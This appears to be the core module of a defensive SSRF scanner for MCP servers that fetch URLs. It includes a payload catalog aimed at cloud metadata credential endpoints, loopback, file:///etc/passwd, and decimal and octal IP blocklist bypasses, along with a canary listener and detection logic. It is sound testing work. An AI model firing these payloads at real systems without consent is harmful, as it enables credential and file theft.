"""Core SSRF probe engine for MCP servers that fetch URLs.

ssrfmcp is a DEFENSIVE, consent-based test harness. It only ever acts against
a target the operator explicitly supplies, and the CLI refuses to run without
an explicit authorization flag.

The engine has three parts:

  * Canary       — a local, ephemeral ``http.server`` that records inbound
                   requests. A unique token is embedded in the path so blind
                   SSRF callbacks can be attributed to a specific payload.
  * Payloads     — a curated set of SSRF probes (cloud metadata endpoints,
                   loopback, link-local, ``file://``, the canary URL, plus
                   bypass encodings) each carrying a classification.
  * Probe driver — submits each payload to the target MCP tool, then fuses two
                   independent oracles to decide whether the target fetched an
                   internal/metadata/canary endpoint:
                     1. the canary callback log (definitive for blind SSRF), and
                     2. response-content fingerprints (definitive for reflected
                        SSRF, e.g. EC2 IMDS / GCP metadata markers in the body).

No payload is ever sent to a host other than the supplied target. The canary
listens only on loopback. Everything is standard-library only.
"""

from __future__ import annotations

import json
import re
import socket
import threading
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field, asdict
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Callable, Dict, List, Optional, Tuple

TOOL_NAME = "ssrfmcp"
TOOL_VERSION = "0.1.0"

# Severity ordering, highest first. Used for sorting + exit-code policy.
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# ---------------------------------------------------------------------------
# Payload catalog
# ---------------------------------------------------------------------------
# Each payload targets a distinct SSRF class. ``kind`` drives severity and the
# detection oracle; ``markers`` are substrings that, if echoed back in the
# target's response body, prove a *reflected* fetch of that internal endpoint.

_AWS_IMDS = "http://169.254.169.254/latest/meta-data/"
_AWS_IMDS_CREDS = (
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
)
_GCP_META = "http://metadata.google.internal/computeMetadata/v1/"
_AZURE_IMDS = (
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)


@dataclass
class Payload:
    id: str
    kind: str           # metadata | loopback | linklocal | file | canary | bypass
    url: str
    description: str
    base_severity: str
    markers: Tuple[str, ...] = ()   # response-body fingerprints of a real fetch


def _builtin_payloads(canary_base: Optional[str]) -> List[Payload]:
    payloads: List[Payload] = [
        Payload(
            "aws-imds-root", "metadata", _AWS_IMDS,
            "AWS EC2 instance metadata service (IMDSv1) root.",
            "critical",
            ("ami-id", "instance-id", "iam/", "security-credentials",
             "meta-data"),
        ),
        Payload(
            "aws-imds-creds", "metadata", _AWS_IMDS_CREDS,
            "AWS IMDS IAM role credentials path — direct credential theft.",
            "critical",
            ("AccessKeyId", "SecretAccessKey", "Token", "security-credentials"),
        ),
        Payload(
            "gcp-metadata", "metadata", _GCP_META,
            "GCP compute metadata server.",
            "critical",
            ("computeMetadata", "instance/", "service-accounts", "project/"),
        ),
        Payload(
            "azure-imds", "metadata", _AZURE_IMDS,
            "Azure instance metadata service.",
            "critical",
            ("compute", "azEnvironment", "vmId", "subscriptionId"),
        ),
        Payload(
            "localhost-http", "loopback", "http://localhost/",
            "Loopback by hostname — reaches services bound to localhost.",
            "high",
            (),
        ),
        Payload(
            "loopback-ip", "loopback", "http://127.0.0.1/",
            "Loopback by IP — reaches host-local admin/debug services.",
            "high",
            (),
        ),
        Payload(
            "linklocal", "linklocal", "http://169.254.169.254/",
            "Link-local address (cloud metadata range) bare root.",
            "high",
            ("meta-data", "metadata", "computeMetadata"),
        ),
        Payload(
            "file-etc-passwd", "file", "file:///etc/passwd",
            "Local file read via file:// scheme (POSIX).",
            "critical",
            ("root:x:0:0", "/bin/", "daemon:", "nobody:"),
        ),
        Payload(
            "file-win-hosts", "file",
            "file:///C:/Windows/System32/drivers/etc/hosts",
            "Local file read via file:// scheme (Windows).",
            "critical",
            ("localhost", "127.0.0.1", "# Copyright"),
        ),
        # Bypass / obfuscation variants — same internal target, encoded to
        # evade naive string blocklists.
        Payload(
            "bypass-decimal", "bypass", "http://2852039166/",
            "IMDS reached via decimal-encoded IP (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
        ),
        Payload(
            "bypass-octal", "bypass", "http://0251.0376.0251.0376/",
            "IMDS reached via octal-encoded IP (blocklist bypass).",
            "high",
            ("meta-data", "metadata"),
        ),
    ]
    if canary_base:
        token = uuid.uuid4().hex
        payloads.append(Payload(
            f"canary-{token[:8]}", "canary",
            f"{canary_base.rstrip('/')}/c/{token}",
            "Operator canary URL — proves blind outbound fetch by the target.",
            "high",
            (token,),
        ))
    return payloads


# ---------------------------------------------------------------------------
# Canary server
# ---------------------------------------------------------------------------

class _CanaryHandler(BaseHTTPRequestHandler):
    server_version = "ssrfmcp-canary/1.0"

    def _record(self) -> None:
        hit = {
            "path": self.path,
            "method": self.command,
            "client": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "host_header": self.headers.get("Host", ""),
            "time": time.time(),
        }
        # The token lives in /c/<token>; pull it back out for attribution.
        m = re.search(r"/c/([0-9a-fA-F]{8,})", self.path)
        if m:
            hit["token"] = m.group(1)
        self.server.canary_hits.append(hit)  # type: ignore[attr-defined]

    def do_GET(self) -> None:  # noqa: N802
        self._record()
        body = b"ssrfmcp-canary ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:  # noqa: N802
        self.do_GET()

    def log_message(self, *_args: Any) -> None:  # silence stderr spam
        return


class Canary:
    """A loopback-only HTTP listener that records inbound SSRF callbacks."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0) -> None:
        self._httpd = ThreadingHTTPServer((host, port), _CanaryHandler)
        self._httpd.canary_hits = []  # type: ignore[attr-defined]
        self.host, self.port = self._httpd.server_address[0], self._httpd.server_address[1]
        self._thread: Optional[threading.Thread] = None

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"

    @property
    def hits(self) -> List[Dict[str, Any]]:
        return list(self._httpd.canary_hits)  # type: ignore[attr-defined]

    def start(self) -> "Canary":
        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                        daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        try:
            self._httpd.shutdown()
        finally:
            self._httpd.server_close()

    def __enter__(self) -> "Canary":
        return self.start()

    def __exit__(self, *_exc: Any) -> None:
        self.stop()


# ---------------------------------------------------------------------------
# Target adapters
# ---------------------------------------------------------------------------

class TargetError(RuntimeError):
    """Raised when the target cannot be reached or returns an unusable shape."""


# A fetcher takes a URL payload and returns (status_code, response_body_text).
Fetcher = Callable[[str], Tuple[int, str]]


def http_mcp_fetcher(
    target: str,
    *,
    tool: str = "fetch",
    arg: str = "url",
    timeout: float = 8.0,
) -> Fetcher:
    """Build a fetcher that submits payloads to an HTTP MCP/JSON tool endpoint.

    The target is expected to accept a JSON ``POST`` of the shape
    ``{"tool": <tool>, "arguments": {<arg>: <payload-url>}}`` and return JSON
    (the MCP ``tools/call`` convention) or any text body. We tolerate both —
    the response body text is what the detection oracle inspects.
    """

    def _fetch(payload_url: str) -> Tuple[int, str]:
        body = json.dumps({
            "tool": tool,
            "arguments": {arg: payload_url},
        }).encode("utf-8")
        req = urllib.request.Request(
            target, data=body, method="POST",
            headers={"Content-Type": "application/json",
                     "User-Agent": f"{TOOL_NAME}/{TOOL_VERSION}"},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                text = resp.read().decode("utf-8", "replace")
                return resp.status, text
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", "replace") if exc.fp else ""
            return exc.code, text
        except (urllib.error.URLError, socket.timeout, OSError) as exc:
            raise TargetError(f"cannot reach target {target}: {exc}") from exc

    return _fetch


# ---------------------------------------------------------------------------
# Detection oracle + scoring
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    payload_id: str
    kind: str
    url: str
    description: str
    vulnerable: bool
    severity: str           # effective severity (info if not vulnerable)
    evidence: List[str] = field(default_factory=list)
    status_code: Optional[int] = None
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def _evaluate(
    payload: Payload,
    status: Optional[int],
    body: str,
    canary_hits: List[Dict[str, Any]],
    canary_token: Optional[str],
    error: str,
) -> ProbeResult:
    evidence: List[str] = []
    vulnerable = False

    if error:
        return ProbeResult(
            payload.id, payload.kind, payload.url, payload.description,
            False, "info", evidence=[], status_code=status, error=error,
        )

    text = body or ""
    low = text.lower()

    # Strip the payload URL itself out of the body before marker matching so a
    # target that merely *echoes the URL back* (e.g. "...meta-data/" in the
    # echoed URL) is not mistaken for one that actually fetched the endpoint.
    # The canary token is intentionally kept, since a canary token appearing in
    # the body is itself proof of a fetch.
    body_minus_url = low.replace(payload.url.lower(), " ")

    # Oracle 1: reflected SSRF — internal-endpoint fingerprints in the body
    # that are NOT merely the echoed request URL.
    for marker in payload.markers:
        if not marker:
            continue
        ml = marker.lower()
        if payload.kind == "canary":
            # For the canary, the token reflected in the body proves a fetch.
            if ml in low:
                vulnerable = True
                evidence.append(
                    f"target response reflected canary token '{marker}' "
                    "(outbound fetch confirmed)")
        elif ml in body_minus_url:
            vulnerable = True
            evidence.append(f"response body contains marker '{marker}'")

    # Oracle 2: blind SSRF — the target called back to our canary.
    if payload.kind == "canary" and canary_token:
        for hit in canary_hits:
            if hit.get("token") == canary_token:
                vulnerable = True
                evidence.append(
                    f"canary callback received from {hit.get('client')} "
                    f"({hit.get('method')} {hit.get('path')})"
                )

    # Heuristic for non-canary probes: an explicit success status with a
    # non-empty body for an internal/file/metadata URL strongly suggests the
    # server performed (and returned) the fetch even without a known marker.
    if not vulnerable and payload.kind in ("metadata", "linklocal", "file",
                                           "bypass", "loopback"):
        if status and 200 <= status < 300 and len(text.strip()) > 0:
            # Avoid flagging a target that merely echoes the URL back.
            echoed_only = payload.url in text and len(text.strip()) <= len(
                payload.url) + 40
            if not echoed_only:
                vulnerable = True
                evidence.append(
                    f"target returned HTTP {status} with a non-empty body for "
                    f"an internal/{payload.kind} URL (probable fetch)"
                )

    severity = payload.base_severity if vulnerable else "info"
    return ProbeResult(
        payload.id, payload.kind, payload.url, payload.description,
        vulnerable, severity, evidence=evidence, status_code=status, error="",
    )


@dataclass
class ScanReport:
    target: str
    canary_base: Optional[str]
    results: List[ProbeResult] = field(default_factory=list)

    @property
    def counts(self) -> Dict[str, int]:
        c = {k: 0 for k in SEVERITY_ORDER}
        for r in self.results:
            if r.vulnerable:
                c[r.severity] = c.get(r.severity, 0) + 1
        return c

    @property
    def vulnerable_count(self) -> int:
        return sum(1 for r in self.results if r.vulnerable)

    @property
    def top_severity(self) -> Optional[str]:
        sevs = [r.severity for r in self.results if r.vulnerable]
        if not sevs:
            return None
        return min(sevs, key=lambda s: SEVERITY_ORDER.get(s, 99))

    @property
    def risk_score(self) -> int:
        """0-100 risk score; higher = more dangerous. Driven by SSRF hits."""
        weights = {"critical": 45, "high": 25, "medium": 10, "low": 4, "info": 0}
        score = sum(weights.get(r.severity, 0)
                    for r in self.results if r.vulnerable)
        return min(100, score)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tool": TOOL_NAME,
            "version": TOOL_VERSION,
            "target": self.target,
            "canary_base": self.canary_base,
            "risk_score": self.risk_score,
            "vulnerable_count": self.vulnerable_count,
            "top_severity": self.top_severity,
            "counts": self.counts,
            "results": [r.to_dict() for r in self.results],
        }


def probe_target(
    target: str,
    *,
    fetcher: Fetcher,
    canary: Optional[Canary] = None,
    payloads: Optional[List[Payload]] = None,
    delay: float = 0.0,
    canary_settle: float = 0.4,
) -> ScanReport:
    """Submit every payload to the target via ``fetcher`` and fuse oracles.

    This is the real detection logic. ``fetcher`` is the only thing that talks
    to the network, and it only ever talks to ``target``. The canary (if any)
    only ever listens on loopback.
    """
    canary_base = canary.base_url if canary else None
    if payloads is None:
        payloads = _builtin_payloads(canary_base)

    # Extract the canary token (if a canary payload is present) for attribution.
    canary_token: Optional[str] = None
    for p in payloads:
        if p.kind == "canary":
            m = re.search(r"/c/([0-9a-fA-F]{8,})", p.url)
            if m:
                canary_token = m.group(1)

    results: List[ProbeResult] = []
    for p in payloads:
        status: Optional[int] = None
        body = ""
        error = ""
        try:
            status, body = fetcher(p.url)
        except TargetError as exc:
            error = str(exc)
        results.append(_evaluate(
            p, status, body,
            canary.hits if canary else [],
            canary_token, error,
        ))
        if delay:
            time.sleep(delay)

    # Give blind callbacks a moment to land before final canary read.
    if canary and canary_token and canary_settle > 0:
        deadline = time.time() + canary_settle
        while time.time() < deadline:
            if any(h.get("token") == canary_token for h in canary.hits):
                break
            time.sleep(0.02)
        # Re-evaluate canary payloads now that late hits may have arrived.
        for i, r in enumerate(results):
            if r.kind == "canary" and not r.vulnerable:
                for hit in canary.hits:
                    if hit.get("token") == canary_token:
                        results[i] = ProbeResult(
                            r.payload_id, r.kind, r.url, r.description,
                            True, "high",
                            evidence=[
                                f"canary callback received from "
                                f"{hit.get('client')} ({hit.get('method')} "
                                f"{hit.get('path')})"
                            ],
                            status_code=r.status_code, error="",
                        )
                        break

    results.sort(key=lambda r: (0 if r.vulnerable else 1,
                                SEVERITY_ORDER.get(r.severity, 99),
                                r.payload_id))
    return ScanReport(target=target, canary_base=canary_base, results=results)


def scan(
    target: str,
    *,
    authorized: bool = False,
    use_canary: bool = True,
    tool: str = "fetch",
    arg: str = "url",
    timeout: float = 8.0,
    delay: float = 0.0,
    fetcher: Optional[Fetcher] = None,
) -> ScanReport:
    """High-level entrypoint: stand up a canary, probe the target, tear down.

    ``authorized`` MUST be True — this is consent-based, dual-use security
    tooling. Callers (CLI / MCP server) are responsible for collecting the
    operator's explicit authorization before invoking.
    """
    if not authorized:
        raise PermissionError(
            "ssrfmcp refuses to probe without explicit authorization. "
            "Pass authorized=True (CLI: --i-have-authorization)."
        )
    if not target or not isinstance(target, str):
        raise ValueError("a non-empty --target must be supplied")

    own_fetcher = fetcher or http_mcp_fetcher(
        target, tool=tool, arg=arg, timeout=timeout)

    canary: Optional[Canary] = None
    try:
        if use_canary:
            canary = Canary().start()
        return probe_target(target, fetcher=own_fetcher, canary=canary,
                            delay=delay)
    finally:
        if canary:
            canary.stop()
